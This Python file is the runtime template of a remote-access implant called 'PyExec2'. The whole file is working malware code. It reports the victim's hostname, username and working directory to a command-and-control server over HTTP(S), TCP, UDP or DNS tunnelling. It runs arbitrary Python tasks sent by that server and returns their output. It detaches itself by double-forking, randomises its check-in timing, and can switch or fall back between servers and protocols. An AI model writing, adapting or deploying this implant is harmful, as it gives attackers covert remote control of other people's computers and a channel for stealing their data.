# PyExec2 implant runtime template (comments stripped before delivery).
import base64
import getpass
import hashlib
import io
import json
import os
import platform
import random
import secrets
import socket
import ssl
import struct
import sys
import threading
import time
import traceback
import urllib.request

CONFIG = __CONFIG_JSON__
SERVER_HOST = CONFIG["host"]
SERVER_PORT = int(CONFIG["port"])
PROTOCOL = CONFIG["protocol"]
BEACON_ID = CONFIG["beacon_id"]
PAYLOAD_TOKEN = CONFIG["payload_token"]
CLIENT_PUBLIC = ""
if CONFIG.get("dh_prime") and CONFIG.get("dh_server_pub"):
    _DH_PRIME = int(CONFIG["dh_prime"])
    _DH_PRIVATE = secrets.randbelow(_DH_PRIME - 3) + 2
    CLIENT_PUBLIC = str(pow(int(CONFIG.get("dh_generator", 2)), _DH_PRIVATE, _DH_PRIME))
    _DH_SHARED = pow(int(CONFIG["dh_server_pub"]), _DH_PRIVATE, _DH_PRIME)
    KEY = hashlib.sha256(
        str(_DH_SHARED).encode("ascii") + b"pyexec2-dh-v1" + BEACON_ID.encode("utf-8")
    ).digest()
else:
    # Backward compatibility for payloads generated before DH support.
    KEY = base64.b64decode(CONFIG["key_b64"])

_ORIG_STDOUT = sys.stdout
_ORIG_STDERR = sys.stderr
_CAPTURE = threading.local()


class _ThreadWriter:
    def __init__(self, original):
        self.original = original

    def write(self, text):
        buffer = getattr(_CAPTURE, "buffer", None)
        if buffer is not None:
            buffer.write(text)
        else:
            self.original.write(text)

    def flush(self):
        buffer = getattr(_CAPTURE, "buffer", None)
        if buffer is not None:
            buffer.flush()
        else:
            self.original.flush()

    def isatty(self):
        return False

    @property
    def encoding(self):
        return "utf-8"


sys.stdout = _ThreadWriter(_ORIG_STDOUT)
sys.stderr = _ThreadWriter(_ORIG_STDERR)


class RuntimeView:
    def __init__(self, g):
        self._g = g
        self.beacon = g["beacon"]
        self.shared = g["shared"]
        self.task = None

    @property
    def globals(self):
        return self._g["globals"]

    def emit(self, text):
        print(str(text))

    def stringify(self, value):
        try:
            return json.dumps(value, ensure_ascii=False, indent=2, default=str)
        except Exception:
            return repr(value)

    def set_global(self, name, value):
        self._g["globals"][name] = value
        return True

    def get_global(self, name, default=None):
        return self._g["globals"].get(name, default)

    def prepare_upgrade(self, payload):
        with G["lock"]:
            G["pending_upgrade"] = dict(payload)
        return {"ok": True, "pending": True, "upgrade": dict(payload)}

    def track_process(self, proc):
        task_id = (self.task or {}).get("id")
        if task_id:
            with G["lock"]:
                if task_id in G["active_tasks"]:
                    G["active_tasks"][task_id]["process"] = proc
        return proc

    def untrack_process(self, proc=None):
        task_id = (self.task or {}).get("id")
        if task_id:
            with G["lock"]:
                entry = G["active_tasks"].get(task_id)
                if entry and (proc is None or entry.get("process") is proc):
                    entry.pop("process", None)

    def schedule_shutdown(self):
        with G["lock"]:
            G["shutdown_after_result"] = True
        return {"ok": True, "shutdown": "after_result"}

    def fork_independent(self):
        import os
        import subprocess
        import sys
        with G["lock"]:
            if G.get("forked"):
                return {"ok": False, "error": "this Beacon process has already forked once"}
            G["forked"] = True
        if hasattr(os, "fork"):
            import warnings
            read_fd, write_fd = os.pipe()
            with warnings.catch_warnings():
                warnings.simplefilter("ignore", DeprecationWarning)
                pid = os.fork()
            if pid == 0:
                try:
                    os.close(read_fd)
                    os.setsid()
                    with warnings.catch_warnings():
                        warnings.simplefilter("ignore", DeprecationWarning)
                        second = os.fork()
                    if second > 0:
                        os._exit(0)
                    os.write(write_fd, str(os.getpid()).encode("ascii"))
                    os.close(write_fd)
                    _CAPTURE.buffer = None
                    with G["lock"]:
                        G["active_tasks"] = {}
                        G["results"] = []
                        G["interval_override"] = None
                    main()
                except BaseException:
                    pass
                os._exit(0)
            os.close(write_fd)
            try:
                final_pid = int(os.read(read_fd, 32).decode("ascii") or "0")
            except Exception:
                final_pid = pid
            os.close(read_fd)
            try:
                os.waitpid(pid, 0)
            except OSError:
                pass
            return {"ok": True, "pid": final_pid, "mode": "fork"}
        script = os.path.abspath(sys.argv[0]) if sys.argv and sys.argv[0] not in ("-", "") else ""
        if not script or not os.path.exists(script):
            return {"ok": False, "error": "fork needs a saved payload.py on this platform"}
        flags = 0
        if os.name == "nt":
            flags = getattr(subprocess, "DETACHED_PROCESS", 0) | getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)
        subprocess.Popen([sys.executable, script], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True, creationflags=flags)
        return {"ok": True, "mode": "spawn"}

    def exec_snippet(self, code):
        local = {"__name__": "__snippet__", "runtime": self, "args": {}}
        exec(compile(code, "<snippet>", "exec"), self._g, local)
        if "__result__" in local:
            return local["__result__"]
        return None

    def control(self, action, args):
        if action == "cancel_task":
            return G["control"].cancel_task(str(args.get("task_id", "")))
        if action == "list_tasks":
            return G["control"].list_tasks()
        if action == "set_interval":
            G["control"].set_interval(float(args.get("interval", CONFIG["initial_interval"])))
            return {"ok": True}
        if action == "set_runtime_settings":
            return G["control"].set_runtime_settings(args)
        if action == "protocol_switch":
            return G["control"].protocol_switch(args)
        return {"ok": False, "error": f"unknown control: {action}"}


class Control:
    def cancel_task(self, task_id):
        with G["lock"]:
            entry = G["active_tasks"].get(task_id)
        if not entry:
            return {"ok": False, "error": "task not running"}
        entry["cancel"].set()
        proc = entry.get("process")
        if proc is not None:
            try:
                if proc.poll() is None:
                    proc.terminate()
                    try:
                        proc.wait(timeout=2)
                    except Exception:
                        proc.kill()
            except Exception:
                pass
        thread_id = entry.get("thread_id")
        if thread_id:
            try:
                import ctypes

                ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_ulong(thread_id), ctypes.py_object(SystemExit))
            except Exception:
                pass
        return {"ok": True, "task_id": task_id}

    def list_tasks(self):
        now = time.time()
        with G["lock"]:
            return [
                {
                    "task_id": key,
                    "thread_id": value.get("thread_id"),
                    "started_at": value.get("started_at"),
                    "elapsed": round(now - float(value.get("started_at", now)), 2),
                    "plugin": value.get("plugin"),
                    "display": value.get("display"),
                    "mode": value.get("mode", "plugin"),
                }
                for key, value in G["active_tasks"].items()
            ]

    def set_interval(self, interval):
        G["heartbeat"]["current"] = max(float(CONFIG["fast_interval"]), min(float(CONFIG["slow_interval"]), float(interval)))

    def set_runtime_settings(self, args):
        fast = max(1.0, min(float(args.get("fast_interval", CONFIG["fast_interval"])), 600.0))
        slow = max(fast, min(float(args.get("slow_interval", CONFIG["slow_interval"])), 3600.0))
        finish = max(0.0, min(float(args.get("finish_delay", CONFIG["finish_delay"])), 300.0))
        jitter = max(0.0, min(float(args.get("jitter", CONFIG["jitter"])), 0.9))
        concurrency = max(1, min(int(args.get("max_concurrent_tasks", CONFIG.get("max_concurrent_tasks", 8))), 64))
        current = float(args.get("current_interval", G["heartbeat"].get("current", CONFIG["initial_interval"])))
        current = max(fast, min(slow, current))
        CONFIG["fast_interval"] = fast
        CONFIG["slow_interval"] = slow
        CONFIG["finish_delay"] = finish
        CONFIG["jitter"] = jitter
        CONFIG["max_concurrent_tasks"] = concurrency
        CONFIG["initial_interval"] = current
        G["interval_override"] = current
        G["heartbeat"].update({
            "current": current,
            "fast_interval": fast,
            "slow_interval": slow,
            "finish_delay": finish,
            "jitter": jitter,
            "max_concurrent_tasks": concurrency,
        })
        return {"ok": True, "settings": dict(G["heartbeat"])}

    def protocol_switch(self, args):
        global SERVER_HOST, SERVER_PORT, KEY, PAYLOAD_TOKEN
        import urllib.parse
        target = str(args.get("protocol") or G["protocol"]).lower()
        if target not in {"tcp", "udp", "http", "https", "dns"}:
            return {"ok": False, "error": "unsupported protocol"}
        host = str(args.get("host") or "").strip()
        port = int(args.get("port") or 0)
        url = str(args.get("url") or "").strip()
        if url:
            parsed = urllib.parse.urlparse(url)
            if parsed.hostname:
                host = parsed.hostname
            if parsed.port:
                port = parsed.port
        if not host:
            return {"ok": False, "error": "host or url is required"}
        if not port:
            return {"ok": False, "error": "port is required"}
        G["fallback"] = {
            "protocol": G["protocol"],
            "host": G["server_host"],
            "port": G["server_port"],
        }
        G["server_host"] = host
        G["server_port"] = port
        SERVER_HOST = host
        SERVER_PORT = port
        if args.get("key"):
            try:
                KEY = base64.b64decode(str(args["key"]))
                if len(KEY) != 32:
                    return {"ok": False, "error": "key must be 32 bytes base64"}
            except Exception:
                return {"ok": False, "error": "invalid base64 key"}
        if args.get("token"):
            PAYLOAD_TOKEN = str(args["token"])
        G["protocol"] = target
        G["globals"]["protocol"] = target
        G["failures"] = 0
        return {"ok": True, "protocol": target, "host": host, "port": port, "token": PAYLOAD_TOKEN, "key_updated": bool(args.get("key"))}


G = {
    "beacon_id": BEACON_ID,
    "protocol": PROTOCOL,
    "server_host": SERVER_HOST,
    "server_port": SERVER_PORT,
    "fallback": {
        "protocol": CONFIG.get("initial_protocol", PROTOCOL),
        "host": CONFIG.get("initial_host", SERVER_HOST),
        "port": int(CONFIG.get("initial_port", SERVER_PORT)),
    },
    "failures": 0,
    "beacon": {
        "hostname": socket.gethostname(),
        "platform": "windows" if os.name == "nt" else "linux",
        "username": getpass.getuser(),
        "python_version": platform.python_version(),
    },
    "lock": threading.RLock(),
    "active_tasks": {},
    "results": [],
    "interval_override": None,
    "forked": False,
    "pending_upgrade": None,
    "shutdown_after_result": False,
    "shared": {},
    "globals": {},
    "heartbeat": {
        "current": float(CONFIG["initial_interval"]),
        "fast_interval": float(CONFIG["fast_interval"]),
        "slow_interval": float(CONFIG["slow_interval"]),
        "finish_delay": float(CONFIG["finish_delay"]),
        "jitter": float(CONFIG["jitter"]),
        "max_concurrent_tasks": int(CONFIG.get("max_concurrent_tasks", 8)),
        "idle_rounds": 0,
        "dispatch_total": 0,
        "last_dispatch_at": 0,
        "failures": 0,
        "last_poll_at": 0,
        "next_poll_at": 0,
    },
}
G["control"] = Control()
RUNTIME = RuntimeView(G)
LAST_RESULT_AT = 0.0


def _jsonable(value):
    try:
        json.dumps(value)
        return value
    except Exception:
        return repr(value)


def _apply_pending_upgrade():
    global KEY, PAYLOAD_TOKEN, SERVER_HOST, SERVER_PORT
    import urllib.parse
    with G["lock"]:
        payload = G.get("pending_upgrade")
        G["pending_upgrade"] = None
    if not payload:
        return
    if payload.get("key"):
        try:
            value = base64.b64decode(str(payload["key"]))
            if len(value) == 32:
                KEY = value
        except Exception:
            pass
    if payload.get("token"):
        PAYLOAD_TOKEN = str(payload["token"])
    host = str(payload.get("host") or "").strip()
    port = int(payload.get("port") or 0)
    url = str(payload.get("url") or "").strip()
    if url:
        parsed = urllib.parse.urlparse(url)
        if parsed.hostname:
            host = parsed.hostname
        if parsed.port:
            port = parsed.port
    if host:
        SERVER_HOST = host
        G["server_host"] = host
    if port:
        SERVER_PORT = port
        G["server_port"] = port
    if payload.get("protocol"):
        G["protocol"] = str(payload["protocol"])
        G["globals"]["protocol"] = G["protocol"]
    G["failures"] = 0

def _outer_request(inner):
    raw = json.dumps(inner, ensure_ascii=False).encode("utf-8")
    sealed = seal(KEY, raw, b"pyexec2-implant")
    request = {"payload_token": PAYLOAD_TOKEN, "data": base64.b64encode(sealed).decode("ascii")}
    if CLIENT_PUBLIC:
        request["client_pub"] = CLIENT_PUBLIC
    return request


def _http_request(outer):
    body = json.dumps(outer).encode("utf-8")
    scheme = "https" if G["protocol"] == "https" else "http"
    url = f"{scheme}://{G['server_host']}:{G['server_port']}/poll"
    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
    context = None
    if scheme == "https":
        if CONFIG.get("tls_ca_pem"):
            context = ssl.create_default_context(cadata=CONFIG["tls_ca_pem"])
            context.check_hostname = False
            context.verify_mode = ssl.CERT_REQUIRED
        else:
            context = ssl._create_unverified_context()
    with urllib.request.urlopen(req, timeout=30, context=context) as response:
        return json.loads(response.read().decode("utf-8"))


def _tcp_request(outer):
    body = json.dumps(outer).encode("utf-8")
    with socket.create_connection((G["server_host"], G["server_port"]), timeout=30) as sock:
        sock.sendall(struct.pack(">I", len(body)) + body)
        header = b""
        while len(header) < 4:
            chunk = sock.recv(4 - len(header))
            if not chunk:
                raise ConnectionError("connection closed")
            header += chunk
        length = struct.unpack(">I", header)[0]
        data = b""
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                raise ConnectionError("connection closed")
            data += chunk
        return json.loads(data.decode("utf-8"))


def _udp_request(outer):
    body = json.dumps(outer).encode("utf-8")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(30)
        sock.sendto(body, (G["server_host"], G["server_port"]))
        data, _ = sock.recvfrom(65535)
        return json.loads(data.decode("utf-8"))


def _encode_dns_name(name):
    out = b""
    for part in name.split("."):
        if not part:
            continue
        raw = part.encode("ascii")
        out += bytes([len(raw)]) + raw
    return out + b"\x00"


def _dns_query(outer):
    raw = json.dumps(outer).encode("utf-8")
    encoded = base64.b32encode(raw).decode("ascii").rstrip("=")
    chunks = [encoded[i:i + 50] for i in range(0, len(encoded), 50)]
    labels = [str(len(chunks)), "0"] + chunks
    qname = ".".join(labels + ["c2", "local"])
    qid = random.randint(0, 65535)
    packet = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
    packet += _encode_dns_name(qname) + struct.pack(">HH", 16, 1)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(30)
        sock.sendto(packet, (G["server_host"], G["server_port"]))
        response, _ = sock.recvfrom(65535)
    offset = 12
    while response[offset] != 0:
        offset += response[offset] + 1
    offset += 5
    ancount = struct.unpack(">H", response[6:8])[0]
    texts = []
    for _ in range(ancount):
        if response[offset] & 0xC0:
            offset += 2
        else:
            while response[offset] != 0:
                offset += response[offset] + 1
            offset += 1
        rtype, rclass, ttl, rdlen = struct.unpack(">HHIH", response[offset:offset + 10])
        offset += 10
        rdata = response[offset:offset + rdlen]
        offset += rdlen
        if rtype == 16 and rdata:
            texts.append(rdata[1:1 + rdata[0]].decode("ascii"))
    encoded_answer = "".join(texts)
    answer = json.loads(base64.b32decode(encoded_answer.upper() + "=" * (-len(encoded_answer) % 8)).decode("utf-8"))
    return answer


def _transport_request(outer):
    if G["protocol"] in {"http", "https"}:
        return _http_request(outer)
    if G["protocol"] == "tcp":
        return _tcp_request(outer)
    if G["protocol"] == "udp":
        return _udp_request(outer)
    if G["protocol"] == "dns":
        return _dns_query(outer)
    raise RuntimeError(f"unsupported protocol: {G['protocol']}")


MAX_RESULT_BYTES = 24 * 1024
RESULT_CHUNK_BYTES = 12 * 1024

def _result_size(result):
    return len(json.dumps(result, ensure_ascii=False).encode("utf-8"))

def _poll_result_batch():
    with G["lock"]:
        snapshot = list(G["results"])
    batch = []
    total = 0
    for result in snapshot:
        size = _result_size(result)
        if batch and total + size > MAX_RESULT_BYTES:
            break
        batch.append(result)
        total += size
        if total >= MAX_RESULT_BYTES:
            break
    return batch, len(snapshot)

def _queue_result(result):
    raw = json.dumps(result, ensure_ascii=False).encode("utf-8")
    result_id = result["task_id"]
    with G["lock"]:
        if len(raw) <= MAX_RESULT_BYTES:
            result["result_id"] = result_id
            G["results"].append(result)
            return
        total = (len(raw) + RESULT_CHUNK_BYTES - 1) // RESULT_CHUNK_BYTES
        digest = hashlib.sha256(raw).hexdigest()
        for index in range(total):
            chunk = raw[index * RESULT_CHUNK_BYTES:(index + 1) * RESULT_CHUNK_BYTES]
            G["results"].append({
                "kind": "result_chunk",
                "result_id": f"{result_id}:c{index}",
                "task_id": result_id,
                "chunk_index": index,
                "chunk_total": total,
                "chunk_hash": digest,
                "chunk_b64": base64.b64encode(chunk).decode("ascii"),
            })

def _poll_once():
    snapshot, pending_count = _poll_result_batch()
    beacon_snapshot = dict(G["beacon"])
    beacon_snapshot["cwd"] = os.getcwd()
    inner = {
        "kind": "poll",
        "beacon": beacon_snapshot,
        "protocol": G["protocol"],
        "results": snapshot,
        "heartbeat": dict(G["heartbeat"]),
    }
    if CONFIG.get("replay_protection"):
        inner["sent_at"] = time.time()
        inner["nonce"] = secrets.token_hex(16)
    outer = _outer_request(inner)
    response_outer = _transport_request(outer)
    raw = open_seal(KEY, base64.b64decode(response_outer["data"]), b"pyexec2-server")
    response = json.loads(raw.decode("utf-8"))
    acked = set(response.get("ack_results", []))
    if acked:
        with G["lock"]:
            G["results"] = [item for item in G["results"] if item.get("result_id") not in acked and item.get("task_id") not in acked]
    tasks = response.get("tasks", [])
    for task in tasks:
        _start_task(task)
    if response.get("upgrade_apply"):
        _apply_pending_upgrade()
    if G.get("shutdown_after_result") and snapshot:
        os._exit(0)
    return len(tasks), response


def _start_task(task):
    task_id = task["task_id"]
    with G["lock"]:
        if task_id in G["active_tasks"]:
            return
        G["active_tasks"][task_id] = {
            "thread_id": None,
            "cancel": threading.Event(),
            "started_at": time.time(),
            "plugin": task.get("plugin"),
            "display": task.get("display"),
            "mode": task.get("mode", "plugin"),
        }
    thread = threading.Thread(target=_run_task, args=(task,), daemon=True)
    thread.start()


def _run_task(task):
    task_id = task["task_id"]
    source = task.get("source", "")
    args = task.get("args", {})
    mode = task.get("mode", "plugin")
    buffer = io.StringIO()
    _CAPTURE.buffer = buffer
    error = ""
    data = None
    with G["lock"]:
        if task_id in G["active_tasks"]:
            G["active_tasks"][task_id]["thread_id"] = threading.get_ident()
    try:
        task_runtime = RuntimeView(G)
        task_runtime.task = {"id": task_id, "plugin": task.get("plugin"), "display": task.get("display")}
        task_globals = dict(G)
        task_globals.update({"__name__": "__implant_task__", "args": args, "runtime": task_runtime, "RUNTIME": task_runtime})
        exec(compile(source, f"<task:{task_id}>", "exec"), task_globals, task_globals)
        if mode == "script":
            if "__result__" in task_globals:
                data = task_globals["__result__"]
        else:
            fn = task_globals.get("run")
            if not callable(fn):
                raise RuntimeError("plugin has no run(runtime, args)")
            data = fn(task_runtime, args)
    except SystemExit:
        error = "cancelled"
    except BaseException as exc:
        error = f"{type(exc).__name__}: {exc}\n{traceback.format_exc()}"
    finally:
        _CAPTURE.buffer = None
    with G["lock"]:
        active_entry = G["active_tasks"].get(task_id)
        if active_entry and active_entry.get("cancel") is not None and active_entry["cancel"].is_set() and not error:
            error = "cancelled"
    output = buffer.getvalue()
    if not output and data is not None:
        output = RUNTIME.stringify(data)
    result = {
        "task_id": task_id,
        "output": output,
        "error": error,
        "data": _jsonable(data) if data is not None else None,
    }
    with G["lock"]:
        G["active_tasks"].pop(task_id, None)
    _queue_result(result)
    global LAST_RESULT_AT
    LAST_RESULT_AT = time.time()


def _jitter(interval):
    ratio = float(CONFIG.get("jitter", 0.2))
    return max(0.1, interval * (1.0 + random.uniform(-ratio, ratio)))


def main():
    interval = float(CONFIG["initial_interval"])
    next_poll = time.time()
    result_retry_at = 0.0
    while True:
        with G["lock"]:
            override = G.get("interval_override")
            if override is not None:
                interval = float(override)
                G["interval_override"] = None
                next_poll = min(next_poll, time.time())
        now = time.time()
        has_results = bool(G["results"])
        result_due = has_results and (now - LAST_RESULT_AT >= float(CONFIG["finish_delay"])) and now >= result_retry_at
        if now >= next_poll or result_due:
            try:
                task_count, response = _poll_once()
                if task_count > 0 or G["active_tasks"]:
                    interval = max(float(CONFIG["fast_interval"]), interval * 0.7)
                else:
                    interval = min(float(CONFIG["slow_interval"]), interval + 1.0)
                hint = response.get("interval_hint")
                if hint:
                    interval = float(hint)
                G["failures"] = 0
                next_poll = time.time() + _jitter(interval)
                if task_count > 0:
                    G["heartbeat"]["idle_rounds"] = 0
                    G["heartbeat"]["dispatch_total"] = int(G["heartbeat"].get("dispatch_total", 0)) + task_count
                    G["heartbeat"]["last_dispatch_at"] = time.time()
                else:
                    G["heartbeat"]["idle_rounds"] = int(G["heartbeat"].get("idle_rounds", 0)) + 1
                G["heartbeat"].update({
                    "current": interval,
                    "fast_interval": float(CONFIG["fast_interval"]),
                    "slow_interval": float(CONFIG["slow_interval"]),
                    "finish_delay": float(CONFIG["finish_delay"]),
                    "jitter": float(CONFIG["jitter"]),
                    "max_concurrent_tasks": int(CONFIG.get("max_concurrent_tasks", 8)),
                    "failures": G["failures"],
                    "last_poll_at": time.time(),
                    "next_poll_at": next_poll,
                })
            except Exception:
                G["failures"] = int(G.get("failures", 0)) + 1
                fallback = G.get("fallback") or {}
                if G["failures"] >= 30 and fallback and G["protocol"] != fallback.get("protocol"):
                    G["protocol"] = fallback.get("protocol", CONFIG.get("initial_protocol", PROTOCOL))
                    G["server_host"] = fallback.get("host", CONFIG.get("initial_host", SERVER_HOST))
                    G["server_port"] = int(fallback.get("port", CONFIG.get("initial_port", SERVER_PORT)))
                    G["failures"] = 0
                interval = min(float(CONFIG["slow_interval"]), interval + 1.0)
                next_poll = time.time() + _jitter(interval)
                G["heartbeat"].update({
                    "current": interval,
                    "failures": G["failures"],
                    "last_poll_at": time.time(),
                    "next_poll_at": next_poll,
                })
        time.sleep(0.2)


if __name__ == "__main__":
    main()
